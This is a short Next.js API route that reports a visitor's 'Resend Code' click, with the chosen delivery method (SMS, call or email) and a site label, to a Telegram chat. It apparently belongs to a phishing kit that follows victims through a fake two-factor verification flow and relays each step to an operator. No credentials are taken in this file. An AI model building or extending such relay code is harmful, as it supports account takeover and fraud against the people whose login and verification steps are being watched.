import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function POST(request) {
  try {
    const body = await request.json().catch(() => ({}));
    const method = String(body.method ?? 'text').toLowerCase();
    const label = { text: 'Text Message (SMS)', call: 'Phone Call', email: 'Email' }[method] || method;

    const message = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '🔄 <b>Resend Code clicked</b>',
      `Method: ${escapeHtml(label)}`,
    ].join('\n');

    await sendTelegramMessage(wrapFlowMessage(message));
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('notify-resend-code:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
